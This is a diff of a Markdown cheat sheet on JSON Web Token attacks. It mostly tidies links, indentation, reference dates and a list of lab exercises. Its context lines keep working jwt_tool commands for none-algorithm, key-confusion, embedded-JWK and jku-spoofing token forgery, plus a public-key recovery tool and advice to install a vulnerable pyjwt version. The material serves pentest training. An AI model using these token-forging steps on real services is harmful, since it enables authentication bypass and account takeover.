@@ -2,13 +2,13 @@
 
 > JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and self-contained way for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed.
 
-## Summary 
 
-- [Summary](#summary)
+## Summary
+
 - [Tools](#tools)
 - [JWT Format](#jwt-format)
-  - [Header](#header)
-  - [Payload](#payload)
+    - [Header](#header)
+    - [Payload](#payload)
 - [JWT Signature](#jwt-signature)
     - [JWT Signature - Null Signature Attack (CVE-2020-28042)](#jwt-signature---null-signature-attack-cve-2020-28042)
     - [JWT Signature - Disclosure of a correct signature (CVE-2019-7644)](#jwt-signature---disclosure-of-a-correct-signature-cve-2019-7644)
@@ -17,22 +17,22 @@
     - [JWT Signature - Key Injection Attack (CVE-2018-0114)](#jwt-signature---key-injection-attack-cve-2018-0114)
     - [JWT Signature - Recover Public Key From Signed JWTs](#jwt-signature---recover-public-key-from-signed-jwts)
 - [JWT Secret](#jwt-secret)
-  - [Encode and Decode JWT with the secret](#encode-and-decode-jwt-with-the-secret)
-  - [Break JWT secret](#break-jwt-secret)
-    - [JWT tool](#jwt-tool)
-    - [Hashcat](#hashcat)
+    - [Encode and Decode JWT with the secret](#encode-and-decode-jwt-with-the-secret)
+    - [Break JWT secret](#break-jwt-secret)
 - [JWT Claims](#jwt-claims)
     - [JWT kid Claim Misuse](#jwt-kid-claim-misuse)
     - [JWKS - jku header injection](#jwks---jku-header-injection)
+- [Labs](#labs)
 - [References](#references)
 
 
 ## Tools
 
-- [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)
-- [brendan-rius/c-jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker)
-- [JOSEPH - JavaScript Object Signing and Encryption Pentesting Helper](https://portswigger.net/bappstore/82d6c60490b540369d6d5d01822bdf61)
-- [jwt.io - Encoder – Decoder](https://jwt.io/)
+- [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool) -  🐍 A toolkit for testing, tweaking and cracking JSON Web Tokens
+- [brendan-rius/c-jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker) - JWT brute force cracker written in C 
+- [PortSwigger/JOSEPH](https://portswigger.net/bappstore/82d6c60490b540369d6d5d01822bdf61) - JavaScript Object Signing and Encryption Pentesting Helper
+- [jwt.io](https://jwt.io/) - Encoder/Decoder
+
 
 ## JWT Format
 
@@ -47,6 +47,7 @@ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9        # header
 eyJzdWIiOiIxMjM0[...]kbWluIjp0cnVlfQ        # payload
 UL9Pz5HbaMdZCV9cS9OcpccjrlkcmLovL2A2aiKiAOY # signature
 ```
+
 
 ### Header
 
@@ -147,7 +148,7 @@ Send a JWT with an incorrect signature, the endpoint might respond with an error
 * [jwt-dotnet/jwt: Critical Security Fix Required: You disclose the correct signature with each SignatureVerificationException... #61](https://github.com/jwt-dotnet/jwt/issues/61)
 * [CVE-2019-7644: Security Vulnerability in Auth0-WCF-Service-JWT](https://auth0.com/docs/secure/security-guidance/security-bulletins/cve-2019-7644)
 
-```
+```ps1
 Invalid signature. Expected SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c got 9twuPVu9Wj3PBneGw1ctrf3knr7RX12v-UwocfLhXIs
 Invalid signature. Expected 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgB1Y= got 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgBOo=
 ```
@@ -158,16 +159,16 @@ Invalid signature. Expected 8Qh5lJ5gSaQylkSdaCIDBoOqKzhoJ0Nutkkap8RgB1Y= got 8Qh
 JWT supports a `None` algorithm for signature. This was probably introduced to debug applications. However, this can have a severe impact on the security of the application.
 
 None algorithm variants:
-* none 
-* None
-* NONE
-* nOnE
+* `none` 
+* `None`
+* `NONE`
+* `nOnE`
 
 To exploit this vulnerability, you just need to decode the JWT and change the algorithm used for the signature. Then you can submit your new JWT. However, this won't work unless you **remove** the signature
 
 Alternatively you can modify an existing JWT (be careful with the expiration time)
 
-* Using [ticarpi/jwt_tool](#)
+* Using [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)
     ```ps1
     python3 jwt_tool.py [JWT_HERE] -X a
     ```
@@ -204,7 +205,7 @@ print jwt.encode({"data":"test"}, key=public, algorithm='HS256')
 
 :warning: This behavior is fixed in the python library and will return this error `jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.`. You need to install the following version: `pip install pyjwt==0.4.3`.
 
-* Using [ticarpi/jwt_tool](#)
+* Using [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)
     ```ps1
     python3 jwt_tool.py JWT_HERE -X k -pk my_public.pem
     ```
@@ -255,16 +256,20 @@ print jwt.encode({"data":"test"}, key=public, algorithm='HS256')
 
 
 **Exploit**:
-* Using [ticarpi/jwt_tool]
+
+* Using [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)
+
     ```ps1
     python3 jwt_tool.py [JWT_HERE] -X i
     ```
-* Using [portswigger/JWT Editor](#)
+
+* Using [portswigger/JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)
     1. Add a `New RSA key`
     2. In the JWT's Repeater tab, edit data
     3. `Attack` > `Embedded JWK`
 
 **Deconstructed**:
+
 ```json
 {
   "alg": "RS256",
@@ -287,6 +292,7 @@ print jwt.encode({"data":"test"}, key=public, algorithm='HS256')
 The RS256, RS384 and RS512 algorithms use RSA with PKCS#1 v1.5 padding as their signature scheme. This has the property that you can compute the public key given two different messages and accompanying signatures. 
 
 [SecuraBV/jws2pubkey](https://github.com/SecuraBV/jws2pubkey): compute an RSA public key from two signed JWTs
+
 ```ps1
 $ docker run -it ttervoort/jws2pubkey JWS1 JWS2
 $ docker run -it ttervoort/jws2pubkey "$(cat sample-jws/sample1.txt)" "$(cat sample-jws/sample2.txt)" | tee pubkey.jwk
@@ -480,12 +486,12 @@ You should create your own key pair for this attack and host it. It should look 
 
 **Exploit**:
 
-* Using [ticarpi/jwt_tool]
+* Using [ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)
     ```ps1
     python3 jwt_tool.py JWT_HERE -X s
     python3 jwt_tool.py JWT_HERE -X s -ju http://example.com/jwks.json
     ```
-* Using [portswigger/JWT Editor](#)
+* Using [portswigger/JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)
     1. Generate a new RSA key and host it
     2. Edit JWT's data
     3. Replace the `kid` header with the one from your JWKS
@@ -502,29 +508,37 @@ You should create your own key pair for this attack and host it. It should look 
 
 ## Labs 
 
-* [JWT authentication bypass via unverified signature](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature)
-* [JWT authentication bypass via flawed signature verification](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification)
-* [JWT authentication bypass via weak signing key](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key)
-* [JWT authentication bypass via jwk header injection](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection)
-* [JWT authentication bypass via jku header injection](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection)
-* [JWT authentication bypass via kid header path traversal](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal)
+* [PortSwigger - JWT authentication bypass via unverified signature](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature)
+* [PortSwigger - JWT authentication bypass via flawed signature verification](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification)
+* [PortSwigger - JWT authentication bypass via weak signing key](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key)
+* [PortSwigger - JWT authentication bypass via jwk header injection](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection)
+* [PortSwigger - JWT authentication bypass via jku header injection](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection)
+* [PortSwigger - JWT authentication bypass via kid header path traversal](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal)
+* [Root Me - JWT - Introduction](https://www.root-me.org/fr/Challenges/Web-Serveur/JWT-Introduction)
+* [Root Me - JWT - Revoked token](https://www.root-me.org/en/Challenges/Web-Server/JWT-Revoked-token)
+* [Root Me - JWT - Weak secret](https://www.root-me.org/en/Challenges/Web-Server/JWT-Weak-secret)
+* [Root Me - JWT - Unsecure File Signature](https://www.root-me.org/en/Challenges/Web-Server/JWT-Unsecure-File-Signature)
+* [Root Me - JWT - Public key](https://www.root-me.org/en/Challenges/Web-Server/JWT-Public-key)
+* [Root Me - JWT - Header Injection](https://www.root-me.org/en/Challenges/Web-Server/JWT-Header-Injection)
+* [Root Me - JWT - Unsecure Key Handling](https://www.root-me.org/en/Challenges/Web-Server/JWT-Unsecure-Key-Handling)
+
 
 ## References
 
-- [5 Easy Steps to Understanding JSON Web Token](https://medium.com/cyberverse/five-easy-steps-to-understand-json-web-tokens-jwt-7665d2ddf4d5)
-- [Attacking JWT authentication - Sep 28, 2016 - Sjoerd Langkemper](https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/)
-- [Club EH RM 05 - Intro to JSON Web Token Exploitation - Nishacid](https://www.youtube.com/watch?v=d7wmUz57Nlg)
-- [Critical vulnerabilities in JSON Web Token libraries - March 31, 2015 - Tim McLean](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries//)
-- [Hacking JSON Web Token (JWT) - Hate_401](https://medium.com/101-writeups/hacking-json-web-token-jwt-233fe6c862e6)
-- [Hacking JSON Web Tokens - From Zero To Hero Without Effort - Websecurify Blog](https://web.archive.org/web/20220305042224/https://blog.websecurify.com/2017/02/hacking-json-web-tokens.html)
-- [Hacking JSON Web Tokens - medium.com Oct 2019](https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a)
-- [HITBGSEC CTF 2017 - Pasty (Web) - amon (j.heng)](https://nandynarwhals.org/hitbgsec2017-pasty/)
-- [How to Hack a Weak JWT Implementation with a Timing Attack - Jan 7, 2017 - Tamas Polgar](https://hackernoon.com/can-timing-attack-be-a-practical-security-threat-on-jwt-signature-ba3c8340dea9)
-- [JSON Web Token Validation Bypass in Auth0 Authentication API - Ben Knight Senior Security Consultant - April 16, 2020](https://insomniasec.com/blog/auth0-jwt-validation-bypass)
-- [JSON Web Token Vulnerabilities - 0xn3va](https://0xn3va.gitbook.io/cheat-sheets/web-application/json-web-token-vulnerabilities)
-- [JWT Hacking 101 - TrustFoundry - Tyler Rosonke - December 8th, 2017](https://trustfoundry.net/jwt-hacking-101/)
-- [Learn how to use JSON Web Tokens (JWT) for Authentication - @dwylhq](https://github.com/dwyl/learn-json-web-tokens)
-- [Privilege Escalation like a Boss - October 27, 2018 - janijay007](https://blog.securitybreached.org/2018/10/27/privilege-escalation-like-a-boss/)
-- [Simple JWT hacking - @b1ack_h00d](https://medium.com/@blackhood/simple-jwt-hacking-73870a976750)
-- [WebSec CTF - Authorization Token - JWT Challenge](https://ctf.rip/websec-ctf-authorization-token-jwt-challenge/)
-- [Write up – JRR Token – LeHack 2019 - 07/07/2019 - LAPHAZE](https://web.archive.org/web/20210512205928/https://rootinthemiddle.org/write-up-jrr-token-lehack-2019/)
+- [5 Easy Steps to Understanding JSON Web Token - Shaurya Sharma - December 21, 2019](https://medium.com/cyberverse/five-easy-steps-to-understand-json-web-tokens-jwt-7665d2ddf4d5)
+- [Attacking JWT authentication - Sjoerd Langkemper - September 28, 2016](https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/)
+- [Club EH RM 05 - Intro to JSON Web Token Exploitation - Nishacid - February 23, 2023](https://www.youtube.com/watch?v=d7wmUz57Nlg)
+- [Critical vulnerabilities in JSON Web Token libraries - Tim McLean - March 31, 2015](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries//)
+- [Hacking JSON Web Token (JWT) - pwnzzzz - May 3, 2018](https://medium.com/101-writeups/hacking-json-web-token-jwt-233fe6c862e6)
+- [Hacking JSON Web Tokens - From Zero To Hero Without Effort - Websecurify - February 9, 2017](https://web.archive.org/web/20220305042224/https://blog.websecurify.com/2017/02/hacking-json-web-tokens.html)
+- [Hacking JSON Web Tokens - Vickie Li - October 27, 2019](https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a)
+- [HITBGSEC CTF 2017 - Pasty (Web) - amon (j.heng) - August 27, 2017](https://nandynarwhals.org/hitbgsec2017-pasty/)
+- [How to Hack a Weak JWT Implementation with a Timing Attack - Tamas Polgar - January 7, 2017](https://hackernoon.com/can-timing-attack-be-a-practical-security-threat-on-jwt-signature-ba3c8340dea9)
+- [JSON Web Token Validation Bypass in Auth0 Authentication API - Ben Knight - April 16, 2020](https://insomniasec.com/blog/auth0-jwt-validation-bypass)
+- [JSON Web Token Vulnerabilities - 0xn3va - March 27, 2022](https://0xn3va.gitbook.io/cheat-sheets/web-application/json-web-token-vulnerabilities)
+- [JWT Hacking 101 - TrustFoundry - Tyler Rosonke - December 8, 2017](https://trustfoundry.net/jwt-hacking-101/)
+- [Learn how to use JSON Web Tokens (JWT) for Authentication - @dwylhq - May 3, 2022](https://github.com/dwyl/learn-json-web-tokens)
+- [Privilege Escalation like a Boss - janijay007 - October 27, 2018](https://blog.securitybreached.org/2018/10/27/privilege-escalation-like-a-boss/)
+- [Simple JWT hacking - Hari Prasanth (@b1ack_h00d) - March 7, 2019](https://medium.com/@blackhood/simple-jwt-hacking-73870a976750)
+- [WebSec CTF - Authorization Token - JWT Challenge - Kris Hunt - August 7, 2016](https://ctf.rip/websec-ctf-authorization-token-jwt-challenge/)
+- [Write up – JRR Token – LeHack 2019 - Laphaze - July 7, 2019](https://web.archive.org/web/20210512205928/https://rootinthemiddle.org/write-up-jrr-token-lehack-2019/)
